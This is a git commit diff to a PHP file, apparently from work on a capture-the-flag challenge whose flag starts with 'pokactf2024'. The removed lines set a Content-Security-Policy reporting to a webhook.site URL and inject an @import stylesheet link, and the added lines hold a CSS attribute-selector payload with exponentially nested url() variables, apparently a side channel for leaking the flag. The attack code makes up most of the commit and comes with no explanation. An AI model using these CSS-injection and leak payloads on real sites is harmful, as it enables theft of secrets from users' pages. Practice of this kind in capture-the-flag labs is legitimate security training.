9fe559eef526cad4c213e5a621d9182c9d6aceac
tadokun468 <huynhluc258@gmail.com>
2024-12-10 02:57:20 +0700

    a

--- src/index.php
+++ src/index.php
@@ -1,6 +1,21 @@
 <?php
-header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/1e0ceffd-be43-4cfc-be6a-be066a25f9d2;");
-echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
+// header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/1e0ceffd-be43-4cfc-be6a-be066a25f9d2;");
+// echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
+echo "<a>hi</a>";
 ?>
+<style>
+h1[flag^="pokactf2024{"] {
+    --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
+    --b: var(--a),var(--a),var(--a),var(--a),var(--a);
+    --c: var(--b),var(--b),var(--b),var(--b),var(--b);
+    --d: var(--c),var(--c),var(--c),var(--c),var(--c);
+    --e: var(--d),var(--d),var(--d),var(--d),var(--d);
+    --f: var(--e),var(--e),var(--e),var(--e),var(--e);
+    --g: var(--f),var(--f),var(--f),var(--f),var(--f);
+};
+* {
+    background-image: var(--g);
+};
+</style>
 
 
